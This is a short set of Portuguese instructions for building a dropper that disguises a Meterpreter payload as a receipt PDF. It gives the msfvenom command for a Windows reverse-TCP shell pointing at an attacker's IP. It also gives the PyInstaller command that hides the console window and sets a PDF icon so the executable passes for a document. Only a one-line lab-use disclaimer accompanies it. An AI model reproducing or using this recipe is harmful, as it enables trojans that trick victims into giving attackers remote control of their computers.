INSTRUÇÕES PARA GERAR DROPPER COM PDF + PAYLOAD.EXE

1. Substitua 'payload.exe' por um payload gerado com:
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=4444 -f exe -o payload.exe

2. Substitua 'comprovante.pdf' por qualquer PDF legítimo.

3. Compile com PyInstaller:
   pyinstaller --noconsole --onefile --icon=pdf_icon.ico dropper.py

4. Resultado final estará na pasta 'dist/'.

Use apenas em laboratórios e ambientes controlados.
